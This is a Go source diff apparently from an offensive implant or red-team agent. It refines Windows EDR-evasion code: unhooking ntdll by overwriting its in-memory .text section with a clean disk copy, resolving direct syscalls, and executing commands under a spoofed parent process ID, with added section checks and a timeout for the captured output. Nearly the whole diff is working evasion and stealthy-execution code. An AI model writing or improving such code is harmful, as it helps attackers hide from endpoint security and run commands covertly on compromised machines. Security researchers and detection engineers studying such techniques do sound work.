@@ -7,6 +7,7 @@ import (
 	"runtime"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -19,6 +20,7 @@ const (
 	OPEN_EXISTING                      = 3
 	SEC_IMAGE                          = 0x1000000
 	PROCESS_ALL_ACCESS                 = 0x001F0FFF
+	PROCESS_CREATE_PROCESS             = 0x0080
 	EXTENDED_STARTUPINFO_PRESENT       = 0x00080000
 	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
 	CREATE_NO_WINDOW                   = 0x08000000
@@ -26,7 +28,7 @@ const (
 
 func initWindowsEvasion() {
 	initResolvedProcs()
-	if runtime.GOARCH == "amd64" {
+	if runtime.GOARCH == "amd64" && skipUnhook != "true" {
 		unhookNtdll()
 	}
 	initSyscallTable()
@@ -332,31 +334,41 @@ func unhookNtdll() {
 		return
 	}
 
-	dosHeader := memDos
-	ntHeaders := memNT
+	memSecOff := uintptr(memDos.E_lfanew) + 24 + uintptr(memNT.OptionalHeaderSize)
+	diskSecOff := uintptr(diskDos.E_lfanew) + 24 + uintptr(diskNT.OptionalHeaderSize)
 
-	sectionOffset := uintptr(dosHeader.E_lfanew) + 24 + uintptr(ntHeaders.OptionalHeaderSize)
+	if memNT.NumberOfSections != diskNT.NumberOfSections {
+		return
+	}
 
-	for i := uint16(0); i < ntHeaders.NumberOfSections; i++ {
-		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hookedBase + sectionOffset + uintptr(i)*40))
-		name := sectionName(section)
+	for i := uint16(0); i < memNT.NumberOfSections; i++ {
+		memSec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hookedBase + memSecOff + uintptr(i)*40))
+		diskSec := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(cleanCopy + diskSecOff + uintptr(i)*40))
 
-		if name == ".text" {
-			var oldProtect uint32
-			addr := hookedBase + uintptr(section.VirtualAddress)
-			size := uintptr(section.VirtualSize)
-
-			syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
-
-			cleanText := unsafe.Pointer(cleanCopy + uintptr(section.VirtualAddress))
-			copy(
-				unsafe.Slice((*byte)(unsafe.Pointer(addr)), size),
-				unsafe.Slice((*byte)(cleanText), size),
-			)
-
-			syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-			break
+		if sectionName(memSec) != ".text" {
+			continue
 		}
+		if sectionName(diskSec) != ".text" {
+			return
+		}
+		if memSec.VirtualSize != diskSec.VirtualSize || memSec.VirtualAddress != diskSec.VirtualAddress {
+			return
+		}
+
+		var oldProtect uint32
+		addr := hookedBase + uintptr(memSec.VirtualAddress)
+		size := uintptr(memSec.VirtualSize)
+
+		syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
+
+		cleanText := unsafe.Pointer(cleanCopy + uintptr(diskSec.VirtualAddress))
+		copy(
+			unsafe.Slice((*byte)(unsafe.Pointer(addr)), size),
+			unsafe.Slice((*byte)(cleanText), size),
+		)
+
+		syscall.SyscallN(rpVirtualProtect, addr, size, PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+		break
 	}
 }
 
@@ -408,7 +420,7 @@ func writeMemory(addr uintptr, data []byte) {
 
 
 func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
-	hParent, _, err := syscall.SyscallN(rpOpenProcess, PROCESS_ALL_ACCESS, 0, uintptr(parentPID))
+	hParent, _, err := syscall.SyscallN(rpOpenProcess, PROCESS_CREATE_PROCESS, 0, uintptr(parentPID))
 	if hParent == 0 {
 		return nil, fmt.Errorf("OpenProcess: %v", err)
 	}
@@ -482,21 +494,36 @@ func ExecuteWithPPIDSpoof(command string, parentPID uint32) ([]byte, error) {
 	syscall.CloseHandle(writePipe)
 	syscall.CloseHandle(pi.Thread)
 
-	var output []byte
-	buf := make([]byte, 4096)
-	for {
-		var n uint32
-		err := syscall.ReadFile(readPipe, buf, &n, nil)
-		if err != nil || n == 0 {
-			break
-		}
-		output = append(output, buf[:n]...)
+	type readResult struct {
+		out []byte
+		err error
 	}
+	readCh := make(chan readResult, 1)
+	go func() {
+		var output []byte
+		buf := make([]byte, 4096)
+		for {
+			var n uint32
+			err := syscall.ReadFile(readPipe, buf, &n, nil)
+			if err != nil || n == 0 {
+				break
+			}
+			output = append(output, buf[:n]...)
+		}
+		readCh <- readResult{output, nil}
+	}()
 
-	syscall.WaitForSingleObject(pi.Process, 30000)
-	syscall.CloseHandle(pi.Process)
-
-	return output, nil
+	// Wait for output with a hard timeout — kill the child if it hangs
+	select {
+	case r := <-readCh:
+		syscall.WaitForSingleObject(pi.Process, 5000)
+		syscall.CloseHandle(pi.Process)
+		return r.out, r.err
+	case <-time.After(20 * time.Second):
+		syscall.TerminateProcess(pi.Process, 1)
+		syscall.CloseHandle(pi.Process)
+		return nil, fmt.Errorf("ppid spoof: child timed out")
+	}
 }
 
 func enumerateProcessNames() []string {
